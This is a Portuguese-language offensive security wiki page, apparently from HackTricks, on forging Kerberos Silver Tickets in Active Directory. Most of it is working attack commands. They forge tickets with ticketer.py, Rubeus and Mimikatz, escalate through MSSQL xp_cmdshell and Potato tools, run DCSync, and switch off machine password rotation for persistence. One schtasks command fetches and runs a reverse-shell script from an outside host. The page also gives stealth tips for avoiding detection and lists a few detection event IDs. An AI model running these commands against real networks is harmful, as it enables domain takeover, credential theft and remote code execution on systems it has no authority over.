# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

O ataque **Silver Ticket** envolve a exploração de tickets de serviço em ambientes Active Directory (AD). Esse método depende da **obtenção do hash NTLM de uma conta de serviço**, como uma conta de computador, para forjar um ticket Ticket Granting Service (TGS). Com esse ticket forjado, um atacante pode acessar serviços específicos na rede, **personificando qualquer usuário**, normalmente visando privilégios administrativos. Ressalta-se que usar chaves AES para forjar tickets é mais seguro e menos detectável.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets são menos detectáveis que Golden Tickets porque exigem apenas o **hash da conta de serviço**, e não o da conta krbtgt. No entanto, eles são limitados ao serviço específico que têm como alvo. Além disso, basta roubar a senha de um usuário.
Além disso, se você comprometer a **senha de uma conta com um SPN**, poderá usar essa senha para criar um Silver Ticket personificando qualquer usuário nesse serviço.

### Mudanças modernas no Kerberos (domínios somente com AES)

- As atualizações do Windows iniciadas em **8 de novembro de 2022 (KB5021131)** definem, por padrão, tickets de serviço com **chaves de sessão AES** quando possível e estão eliminando gradualmente o RC4. Espera-se que os DCs sejam distribuídos com o RC4 **desabilitado por padrão até meados de 2026**, portanto depender de hashes NTLM/RC4 para Silver Tickets falhará cada vez mais com `KRB_AP_ERR_MODIFIED`. Sempre extraia as **chaves AES** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) da conta de serviço-alvo.<sup>[[5]](#references)</sup>
- Se `msDS-SupportedEncryptionTypes` da conta de serviço estiver restrito a AES, você deverá forjar usando `/aes256` ou `-aesKey`; RC4 (`/rc4` ou `-nthash`) não funcionará mesmo que você possua o hash NTLM.<sup>[[6]](#references)</sup>
- Contas gMSA/de computador são alternadas a cada 30 dias; extraia a **chave AES atual** do LSASS, Secretsdump/NTDS ou DCsync antes de forjar.
- OPSEC: a duração padrão dos tickets nas ferramentas costuma ser de **10 anos**; defina durações realistas (por exemplo, `-duration 600` minutos) para evitar detecção por durações anormais.<sup>[[6]](#references)</sup>

Para criar tickets, diferentes ferramentas são utilizadas de acordo com o sistema operacional:

### No Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### No Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
O serviço CIFS é destacado como um alvo comum para acessar o sistema de arquivos da vítima, mas outros serviços, como HOST e RPCSS, também podem ser explorados para tarefas e consultas WMI.

### Exemplo: serviço MSSQL (MSSQLSvc) + Potato para SYSTEM

Se você tiver o hash NTLM (ou a chave AES) de uma conta de serviço SQL (por exemplo, sqlsvc), poderá forjar um TGS para o SPN MSSQL e personificar qualquer usuário no serviço SQL. A partir daí, habilite xp_cmdshell para executar comandos como a conta de serviço SQL. Se esse token tiver SeImpersonatePrivilege, encadeie um Potato para elevar para SYSTEM.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Se o contexto resultante tiver SeImpersonatePrivilege (frequentemente verdadeiro para service accounts), use uma variante do Potato para obter SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Mais detalhes sobre o abuso de MSSQL e a habilitação de xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Visão geral das técnicas Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Serviços Disponíveis

| Tipo de Serviço                            | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependendo do sistema operacional, também:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Em algumas ocasiões, você pode simplesmente solicitar: WINRM</p> |
| Tarefas Agendadas                          | HOST                                                                       |
| Windows File Share, também psexec          | CIFS                                                                       |
| Operações LDAP, incluindo DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus**, você pode **solicitar todos** esses tickets usando o parâmetro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### IDs de eventos de Silver tickets

- 4624: Logon de conta
- 4634: Logoff de conta
- 4672: Logon de administrador
- **A ausência de um 4768/4769 anterior no DC** para o mesmo cliente/serviço é um indicador comum de que um TGS forjado foi apresentado diretamente ao serviço.
- Um tempo de vida do ticket anormalmente longo ou um tipo de criptografia inesperado (RC4 quando o domínio exige AES) também se destaca nos dados 4769/4624.

## Persistência

Para evitar que as máquinas alterem a própria senha a cada 30 dias, defina `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou defina `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` com um valor maior que 30 dias, indicando o período de rotação em que a senha das máquinas deverá ser alterada.<sup>[[3]](#references)</sup>

## Abusando de Service tickets

Nos exemplos a seguir, vamos imaginar que o ticket foi obtido personificando a conta de administrador.

### CIFS

Com este ticket, você poderá acessar as pastas `C$` e `ADMIN$` via **SMB** (se estiverem expostas) e copiar arquivos para uma parte do sistema de arquivos remoto fazendo algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Você também poderá obter um shell dentro do host ou executar comandos arbitrários usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Com essa permissão, você pode criar tarefas agendadas em computadores remotos e executar comandos arbitrários:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Com esses tickets, você pode **executar WMI no sistema da vítima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encontre **mais informações sobre wmiexec** na página a seguir:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Com acesso winrm a um computador, você pode **acessá-lo** e até obter um PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Confira a página a seguir para conhecer **mais formas de se conectar a um host remoto usando winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Observe que o **winrm deve estar ativo e escutando** no computador remoto para acessá-lo.

### LDAP

Com este privilégio, você pode despejar o banco de dados do DC usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saiba mais sobre DCSync** na página a seguir:


{{#ref}}
dcsync.md
{{#endref}}


## Referências

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Como atacar o Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Processo de senha da conta de máquina - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: caminho Silver Ticket + Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: hardening do Kerberos e descontinuação do RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Opções atuais do ticketer.py do Impacket (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
